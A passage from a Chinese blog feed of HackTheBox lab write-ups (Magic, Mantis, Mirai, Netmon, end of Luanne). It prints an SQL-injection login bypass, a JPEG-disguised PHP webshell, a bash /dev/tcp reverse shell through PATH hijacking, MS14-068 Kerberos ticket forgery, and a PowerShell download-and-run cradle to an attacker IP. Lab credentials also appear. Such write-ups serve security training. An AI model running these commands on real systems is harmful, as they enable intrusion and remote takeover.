<p>解压之后得到另一个hash</p>
<p><img src="/images/Luanne/31.png" alt="31"></p>
<p>破解之后得到密码<code>littlebear</code></p>
<p><img src="/images/Luanne/32.png" alt="32"></p>
<p>之后就可以切换到root了，不过BSD系列用了doas代替了sudo</p>
<p><img src="/images/Luanne/33.png" alt="33"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Magic</title>
    <url>/2020/11/16/HTB-Magic/</url>
    <content><![CDATA[<h1 id="Maigc"><a href="#Maigc" class="headerlink" title="Maigc"></a>Maigc</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/magic/1.png" alt="1"></p>
<p>只发现了22和80端口，大概率是一次web渗透</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/magic/8.png" alt="8"></p>
<p>可以发现直接枚举到images下面的目录，尝试访问images目录</p>
<p><img src="/images/magic/9.png" alt="9"></p>
<p>提示无法访问，所以这个<code>images/uploads</code>的路径应该是从其他页面上爬出来的</p>
<p>检查后发现主页有提示</p>
<p><img src="/images/magic/10.png" alt="10"></p>
<p>所以不需要子目录枚举</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>直接访问首页就可以找到登录页面</p>
<p><img src="/images/magic/2.png" alt="2"></p>
<p>尝试一些弱口令，发现不行，会报错提示</p>
<p><img src="/images/magic/3.png" alt="3"></p>
<p>尝试sql注入，这里可能需要使用burp，页面无法输入空格，可能是某个javascript的功能，但其实无法所谓，可以使用sql注入的bypass空格的技巧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x3D;1#</span><br></pre></td></tr></table></figure>

<p>年轻人不讲武德，很快啊，很快，就得到了上传点</p>
<p><img src="/images/magic/4.png" alt="4"></p>
<p>尝试上传</p>
<p><img src="/images/magic/5.png" alt="5"></p>
<p>发现存在过滤，提示了允许上传的类型</p>
<p>看来不允许上传gif，所以可能需要jpeg的magic bytes进行绕过，我选择用一种简单粗暴的方式</p>
<p>先从网上随便下一张图片，名称为timg.jpg，直接凭借webshell的代码到maigc bytes后面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">head -n 2 timg.jpg &gt;shell.jpg</span><br><span class="line">cat shell.php &gt;&gt;shell.jpg</span><br></pre></td></tr></table></figure>

<p><img src="/images/magic/6.png" alt="6"></p>
<p>尝试上传</p>
<p><img src="/images/magic/7.png" alt="7"></p>
<p>提示上传成功，尝试去寻找webshell</p>
<p><code>images/uploads</code>目录显示文件</p>
<p><img src="/images/magic/12.png" alt="12"></p>
<p>但可以被直接访问到</p>
<p><img src="/images/magic/11.png" alt="11"></p>
<p>正常情况下，.jpg结尾的webshell需要LFI来获得RCE，但这里貌似apache存在某种解析漏洞，.jpg也可以RCE</p>
<p><img src="/images/magic/13.png" alt="13"></p>
<p>机器上没nc，用/dev/tcp反弹shell即可</p>
<p><img src="/images/magic/14.png" alt="14"></p>
<p>之后可以找webshell工作的原因，来自于.htaccess</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;.+\.ph(p([3457s]|\-s)?|t|tml)&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br><span class="line">&lt;Files ~ &quot;\.(sh|sql)&quot;&gt;</span><br><span class="line">   order deny,allow</span><br><span class="line">   deny from all</span><br></pre></td></tr></table></figure>

<p>只要文件名中包含ph(正则)，就会被php解析</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>发现了普通用户</p>
<p><img src="/images/magic/15.png" alt="15"></p>
<p>由于是sql注入进来的，所以尝试寻找数据库信息</p>
<p>web目录发现了连接信息和数据库名 </p>
<p><img src="/images/magic/16.png" alt="16"></p>
<p>不过竟然没有mysql连接程序</p>
<p><img src="/images/magic/17.png" alt="17"></p>
<p>可以使用mysqldump，不过看起来可能有些不友好</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">mysqldump -u theseus -p --databases Magic</span><br><span class="line">iamkingtheseus</span><br></pre></td></tr></table></figure>

<p><img src="/images/magic/19.png" alt="19"></p>
<p>远程端口转发可能好一些</p>
<p>这里需要指定ip和端口，否则会报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#mysql -u theseus -piamkingtheseus</span><br><span class="line">ERROR 2002 (HY000): Can&#39;t connect to local MySQL server through socket &#39;&#x2F;var&#x2F;run&#x2F;mysqld&#x2F;mysqld.sock&#39; (2)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#mysql -u theseus -piamkingtheseus -h 127.0.0.1 -P 3306</span><br></pre></td></tr></table></figure>

<p><img src="/images/magic/18.png" alt="18"></p>
<h3 id="user"><a href="#user" class="headerlink" title="user"></a>user</h3><p>密码切换到用户</p>
<p><img src="/images/magic/20.png" alt="20"></p>
<h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><p>发现了不寻常的SUID文件</p>
<p><img src="/images/magic/21.png" alt="21"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ltrace &#x2F;bin&#x2F;sysinfo</span><br></pre></td></tr></table></figure>

<p>发现</p>
<p><img src="/images/magic/22.png" alt="22"></p>
<p>看来是可以PATH劫持，不过这里稍微卡了一下，PATH不能随便设置，因为如果PATH只设置成/tmp，程序根本运行不到调用cat那一步，就报错停止了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo $PATH</span><br><span class="line">echo &quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.2&#x2F;5555 0&gt;&amp;1&#39;&quot; &gt; &#x2F;tmp&#x2F;cat</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;local&#x2F;games</span><br><span class="line">which cat</span><br></pre></td></tr></table></figure>

<p>所以正确的方法是在当前PATH的最前面，加上/tmp，这样cat会优先调用/tmp/cat，而不是/bin/cat</p>
<p><img src="/images/magic/23.png" alt="23"></p>
<p>这样运行SUID文件，就能获得reverse_shell</p>
<p><img src="/images/magic/24.png" alt="24"></p>
<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>靶机非常贴心的给出了SUID提权的源代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;cassert&gt;</span><br><span class="line">#include &lt;cstdio&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;memory&gt;</span><br><span class="line">#include &lt;stdexcept&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line">#include &lt;array&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">std::string exec(const char* cmd) &#123;</span><br><span class="line">    std::array&lt;char, 128&gt; buffer;</span><br><span class="line">    std::string result;</span><br><span class="line">    std::unique_ptr&lt;FILE, decltype(&amp;pclose)&gt; pipe(popen(cmd, &quot;r&quot;), pclose);</span><br><span class="line">    if (!pipe) &#123;</span><br><span class="line">        throw std::runtime_error(&quot;popen() failed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    while (fgets(buffer.data(), buffer.size(), pipe.get()) !&#x3D; nullptr) &#123;</span><br><span class="line">        result +&#x3D; buffer.data();</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    cout &lt;&lt; &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Hardware Info&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot; &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; exec(&quot;lshw -short&quot;) &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Disk Info&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot; &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; exec(&quot;fdisk -l&quot;) &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;CPU Info&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot; &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; exec(&quot;cat &#x2F;proc&#x2F;cpuinfo&quot;) &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;MEM Usage&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot; &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; exec(&quot;free -h&quot;);</span><br><span class="line">    return(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现，只要exec执行的程序，都可以进行PATH劫持 ，如lshw，fdisk，cat，free</p>
<p>sqlmap注入可能存在一些问题，也许应该使用tamper</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -r sqli --batch --tamper&#x3D;space2comment --risk&#x3D;3 --level&#x3D;5 --dbms&#x3D;mysql</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Mantis</title>
    <url>/2021/05/10/HTB-Mantis/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Mantis/1.png" alt="1"></p>
<p>对方机器为域环境</p>
<p>SMB和RPC枚举没有发现，对88 Kerberos端口进行枚举，得到用户名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerbrute userenum --domain htb.local dict --dc 10.10.10.52</span><br></pre></td></tr></table></figure>

<p><img src="/images/Mantis/2.png" alt="2"></p>
<p>8080端口运行着web应用<code>Orchard</code></p>
<p><img src="/images/Mantis/3.png" alt="3"></p>
<p>不过没有有效的漏洞利用</p>
<p><img src="/images/Mantis/4.png" alt="4"></p>
<p>枚举</p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>发现了凭据，是二进制数据，python3将其转换为ASCII</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; n &#x3D; int(&#39;010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001&#39;, 2)</span><br><span class="line">&gt;&gt;&gt; n.to_bytes((n.bit_length() + 7) &#x2F;&#x2F; 8, &#39;big&#39;).decode()</span><br><span class="line">@dm!n_P@ssW0rd!</span><br></pre></td></tr></table></figure>

<p>该凭据可以登入Web后台，但是没有地方RCE</p>
<p><img src="/images/Mantis/8.png" alt="8"></p>
<p>另一处文件名是base64编码，解码后16也可以转换为ASCII</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali # echo -n NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx|base64 -d |xxd -ps -r</span><br><span class="line">m$$ql_S@_P@ssW0rd!</span><br></pre></td></tr></table></figure>

<p>DBeaver连接</p>
<p><img src="/images/Mantis/7.png" alt="7"></p>
<p>得到<code>james/J@m3s_P@ssW0rd!</code></p>
<p>尝试使用crackmapexec，没有显示pwned，应该不能直接得到shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.10.10.52 -u james -p &#39;J@m3s_P@ssW0rd!&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Mantis/9.png" alt="9"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h2><p>该机器收到漏洞MS14-068的影响，我们可以在普通用户的权限下获得黄金票据，也就是获得了域管理员权限，利用方式参考<a href="https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html">链接</a></p>
<p>首先机器安装kerberos环境</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install krb5-user cifs-utils rdate</span><br></pre></td></tr></table></figure>

<p>修改/etc/hosts</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.52 mantis.htb.local mantis</span><br></pre></td></tr></table></figure>

<p>添加DNS地址到/etc/resolv.conf</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nameserver 10.10.10.52</span><br></pre></td></tr></table></figure>

<p>编辑/etc/krb5.conf配置如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[libdefaults]</span><br><span class="line">    default_realm &#x3D; HTB.LOCAL</span><br><span class="line">  </span><br><span class="line">[realms]</span><br><span class="line">    LAB.LOCAL &#x3D; &#123;</span><br><span class="line">        kdc &#x3D; mantis.htb.local:88</span><br><span class="line">        admin_server &#x3D; mantis.htb.local</span><br><span class="line">        default_domain &#x3D; HTB.LOCAL</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">[domain_realm]</span><br><span class="line">    .domain.internal &#x3D; HTB.LOCAL</span><br><span class="line">    domain.internal &#x3D; HTB.LOCAL</span><br></pre></td></tr></table></figure>

<p>确认时间同步，误差为+/- 5分钟</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdate -n 10.10.10.52</span><br></pre></td></tr></table></figure>

<p>在进行漏洞利用前，首先要确认kerberos的运行状态，所以先生成现有的票据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kinit james</span><br></pre></td></tr></table></figure>

<p>之后通过klist进行查看，如下显示，应该就是正常和域控交互了</p>
<p><img src="/images/Mantis/10.png" alt="10"></p>
<p>之后尝试通过票据和C盘进行smb连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbclient -W htb.local &#x2F;&#x2F;mantis&#x2F;c$ -k</span><br></pre></td></tr></table></figure>

<p>这里预期性的失败了，因为票据不是管理员权限</p>
<p>之后再尝试和SYSVOL进行连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbclient -W htb.local &#x2F;&#x2F;mantis&#x2F;sysvol -k</span><br></pre></td></tr></table></figure>

<p>这里会预期性的成功</p>
<p><img src="/images/Mantis/11.png" alt="11"></p>
<p>在伪造黄金票据之前，我们需要当前用户的SID，可以通过RPC枚举得到</p>
<p><img src="/images/Mantis/12.png" alt="12"></p>
<p>得到<code>S-1-5-21-4220043660-4019079961-2895681657-1103</code></p>
<p>现在可以伪造黄金票据了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python ms14-068.py -u james@htb.local -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis.htb.local</span><br></pre></td></tr></table></figure>

<p><img src="/images/Mantis/13.png" alt="13"></p>
<p>这会生成一个票据文件，我们需要用它覆盖原有的票据文件。之后尝试连接C盘</p>
<p><img src="/images/Mantis/14.png" alt="14"></p>
<p>连接成功，这证明我们已经具有了域管理员权限，到这里，我们已经可以读取C盘上的任意文件了</p>
<p>最后获取shell，可以通过Impacket的goldenPac.py，它的原理和psexec相同，只是使用了我们生成的域管理员票据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">goldenPac.py htb.local&#x2F;james@mantis.htb.local</span><br></pre></td></tr></table></figure>

<p>最后还会碰到一个问题，找到了遇到一篇issue<a href="https://github.com/SecureAuthCorp/impacket/issues/385">链接</a>，升级版本可解决</p>
<p><img src="/images/Mantis/15.png" alt="15"></p>
<p>最后获得shell</p>
<p><img src="/images/Mantis/16.png" alt="16"></p>
<h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p>用户james不是administrator权限，对smb的共享都不可写，但由于某些原因，可能是测试，似乎一些人使用psexec对该机器发起了攻击，并且没有完成自动清理部分，导致残留了该工具创建的服务。因此james用户也能触发它们并获得shell，神奇。。</p>
<p><a href="https://forum.hackthebox.eu/discussion/529/mantis-write-up-by-alamot">https://forum.hackthebox.eu/discussion/529/mantis-write-up-by-alamot</a><br><a href="https://github.com/SecureAuthCorp/impacket/issues/346">https://github.com/SecureAuthCorp/impacket/issues/346</a></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Mirai</title>
    <url>/2020/10/24/HTB-Mirai/</url>
    <content><![CDATA[<h1 id="mirai"><a href="#mirai" class="headerlink" title="mirai"></a>mirai</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Mirai/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Mirai/2.png" alt="2"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p><img src="/images/Mirai/3.png" alt="3"></p>
<p>找到默认凭据</p>
<p><img src="/images/Mirai/5.png" alt="5"></p>
<p>可以ssh</p>
<p><img src="/images/Mirai/6.png" alt="6"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Mirai/7.png" alt="7"></p>
<p>root.txt无法直接读，提示在USB里有备份</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@raspberrypi:&#x2F;media&#x2F;usbstick# df -h</span><br><span class="line">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="line">aufs            8.5G  2.8G  5.3G  35% &#x2F;</span><br><span class="line">tmpfs           100M  4.8M   96M   5% &#x2F;run</span><br><span class="line">&#x2F;dev&#x2F;sda1       1.3G  1.3G     0 100% &#x2F;lib&#x2F;live&#x2F;mount&#x2F;persistence&#x2F;sda1</span><br><span class="line">&#x2F;dev&#x2F;loop0      1.3G  1.3G     0 100% &#x2F;lib&#x2F;live&#x2F;mount&#x2F;rootfs&#x2F;filesystem.squashfs</span><br><span class="line">tmpfs           250M     0  250M   0% &#x2F;lib&#x2F;live&#x2F;mount&#x2F;overlay</span><br><span class="line">&#x2F;dev&#x2F;sda2       8.5G  2.8G  5.3G  35% &#x2F;lib&#x2F;live&#x2F;mount&#x2F;persistence&#x2F;sda2</span><br><span class="line">devtmpfs         10M     0   10M   0% &#x2F;dev</span><br><span class="line">tmpfs           250M  8.0K  250M   1% &#x2F;dev&#x2F;shm</span><br><span class="line">tmpfs           5.0M  4.0K  5.0M   1% &#x2F;run&#x2F;lock</span><br><span class="line">tmpfs           250M     0  250M   0% &#x2F;sys&#x2F;fs&#x2F;cgroup</span><br><span class="line">tmpfs           250M  8.0K  250M   1% &#x2F;tmp</span><br><span class="line">&#x2F;dev&#x2F;sdb        8.7M   93K  7.9M   2% &#x2F;media&#x2F;usbstick</span><br><span class="line">tmpfs            50M     0   50M   0% &#x2F;run&#x2F;user&#x2F;999</span><br><span class="line">tmpfs            50M     0   50M   0% &#x2F;run&#x2F;user&#x2F;1000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@raspberrypi:&#x2F;media&#x2F;usbstick# mount</span><br><span class="line">sysfs on &#x2F;sys type sysfs (rw,nosuid,nodev,noexec,relatime)</span><br><span class="line">proc on &#x2F;proc type proc (rw,nosuid,nodev,noexec,relatime)</span><br><span class="line">tmpfs on &#x2F;run type tmpfs (rw,nosuid,relatime,size&#x3D;102396k,mode&#x3D;755)</span><br><span class="line">&#x2F;dev&#x2F;sda1 on &#x2F;lib&#x2F;live&#x2F;mount&#x2F;persistence&#x2F;sda1 type iso9660 (ro,noatime)</span><br><span class="line">&#x2F;dev&#x2F;loop0 on &#x2F;lib&#x2F;live&#x2F;mount&#x2F;rootfs&#x2F;filesystem.squashfs type squashfs (ro,noatime)</span><br><span class="line">tmpfs on &#x2F;lib&#x2F;live&#x2F;mount&#x2F;overlay type tmpfs (rw,relatime)</span><br><span class="line">&#x2F;dev&#x2F;sda2 on &#x2F;lib&#x2F;live&#x2F;mount&#x2F;persistence&#x2F;sda2 type ext4 (rw,noatime,data&#x3D;ordered)</span><br><span class="line">aufs on &#x2F; type aufs (rw,noatime,si&#x3D;75eb8ac9,noxino)</span><br><span class="line">devtmpfs on &#x2F;dev type devtmpfs (rw,nosuid,size&#x3D;10240k,nr_inodes&#x3D;58955,mode&#x3D;755)</span><br><span class="line">securityfs on &#x2F;sys&#x2F;kernel&#x2F;security type securityfs (rw,nosuid,nodev,noexec,relatime)</span><br><span class="line">tmpfs on &#x2F;dev&#x2F;shm type tmpfs (rw,nosuid,nodev)</span><br><span class="line">devpts on &#x2F;dev&#x2F;pts type devpts (rw,nosuid,noexec,relatime,gid&#x3D;5,mode&#x3D;620,ptmxmode&#x3D;000)</span><br><span class="line">tmpfs on &#x2F;run&#x2F;lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size&#x3D;5120k)</span><br><span class="line">tmpfs on &#x2F;sys&#x2F;fs&#x2F;cgroup type tmpfs (ro,nosuid,nodev,noexec,mode&#x3D;755)</span><br><span class="line">cgroup on &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,release_agent&#x3D;&#x2F;lib&#x2F;systemd&#x2F;systemd-cgroups-agent,name&#x3D;systemd)</span><br><span class="line">pstore on &#x2F;sys&#x2F;fs&#x2F;pstore type pstore (rw,nosuid,nodev,noexec,relatime)</span><br><span class="line">cgroup on &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)</span><br><span class="line">cgroup on &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)</span><br><span class="line">cgroup on &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)</span><br><span class="line">cgroup on &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)</span><br><span class="line">cgroup on &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)</span><br><span class="line">cgroup on &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)</span><br><span class="line">cgroup on &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)</span><br><span class="line">systemd-1 on &#x2F;proc&#x2F;sys&#x2F;fs&#x2F;binfmt_misc type autofs (rw,relatime,fd&#x3D;22,pgrp&#x3D;1,timeout&#x3D;300,minproto&#x3D;5,maxproto&#x3D;5,direct)</span><br><span class="line">hugetlbfs on &#x2F;dev&#x2F;hugepages type hugetlbfs (rw,relatime)</span><br><span class="line">debugfs on &#x2F;sys&#x2F;kernel&#x2F;debug type debugfs (rw,relatime)</span><br><span class="line">mqueue on &#x2F;dev&#x2F;mqueue type mqueue (rw,relatime)</span><br><span class="line">tmpfs on &#x2F;tmp type tmpfs (rw,nosuid,nodev,relatime)</span><br><span class="line">&#x2F;dev&#x2F;sdb on &#x2F;media&#x2F;usbstick type ext4 (ro,nosuid,nodev,noexec,relatime,data&#x3D;ordered)</span><br><span class="line">tmpfs on &#x2F;run&#x2F;user&#x2F;999 type tmpfs (rw,nosuid,nodev,relatime,size&#x3D;51200k,mode&#x3D;700,uid&#x3D;999,gid&#x3D;997)</span><br><span class="line">tmpfs on &#x2F;run&#x2F;user&#x2F;1000 type tmpfs (rw,nosuid,nodev,relatime,size&#x3D;51200k,mode&#x3D;700,uid&#x3D;1000,gid&#x3D;1000)</span><br></pre></td></tr></table></figure>

<p>flag在</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strings &#x2F;dev&#x2F;sdb</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Netmon</title>
    <url>/2020/07/02/HTB-Netmon/</url>
    <content><![CDATA[<h1 id="Netmon"><a href="#Netmon" class="headerlink" title="Netmon"></a>Netmon</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Netmon/1.jpg" alt="1"></p>
<p>扫描发现ftp、smb、http服务<br>而且ftp运行匿名登录，好像共享了整个主硬盘</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>80端口主页运行着network monitor</p>
<p><img src="/images/Netmon/2.jpg" alt="2"></p>
<p>尝试获取配置文件，谷歌<code>network monitor configuration file</code>搜索配置文件位置</p>
<p><img src="/images/Netmon/3.jpg" alt="3"></p>
<p>读取配置文件</p>
<p><img src="/images/Netmon/4.jpg" alt="4"></p>
<p>找到账户密码<br><code>prtgadmin/PrTg@dmin2019</code></p>
<p><img src="/images/Netmon/5.jpg" alt="5"></p>
<p>成功登录</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>搜索公开漏洞<br>searchsploit里只找到xss和dos<br>谷歌都是找到了，漏洞编号CVE-2018-9276</p>
<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p><a href="https://github.com/M4LV0/PRTG-Network-Monitor-RCE">链接</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;prtg-exploit.sh -u http:&#x2F;&#x2F;10.10.10.152 -c &quot;_ga&#x3D;GA1.4.82101342.1593691949; _gid&#x3D;GA1.4.1955629339.1593691949; OCTOPUS1813713946&#x3D;ezhGMDBGQTBCLTg4MUMtNDVDRS04Mzk2LTdCRDNCNDg4NEJENH0%3D&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Netmon/8.jpg" alt="8"></p>
<p>该脚本给出了提示，需要使用c参数指定完成登录的cookie</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">psexec.py pentest:&#39;P3nT3st!&#39;@10.10.10.152</span><br></pre></td></tr></table></figure>

<p><img src="/images/Netmon/9.jpg" alt="9"></p>
<h3 id="手动"><a href="#手动" class="headerlink" title="手动"></a>手动</h3><p>手动利用位置</p>
<p><img src="/images/Netmon/10.jpg" alt="10"></p>
<p>接着</p>
<p><img src="/images/Netmon/6.jpg" alt="6"></p>
<p>添加指令</p>
<p><img src="/images/Netmon/11.jpg" alt="11"></p>
<p><img src="/images/Netmon/12.jpg" alt="12"></p>
<p>先使用tcpdump配合对方ping命令，检测RCE是否成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcpdump -i tun0 icmp</span><br></pre></td></tr></table></figure>

<p><img src="/images/Netmon/13.jpg" alt="13"></p>
<p>发现检测到了imcp包，说明RCE成功</p>
<p>不过常规的反弹powershell没有生效</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Powershell iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.98&#x2F;winpriv&#x2F;Invoke-PowerShellTcp.ps1&#39;)</span><br></pre></td></tr></table></figure>

<p>可能是某些闭合的原因造成，具体也不清楚，不过可以使用powershell自带的base64编码解决</p>
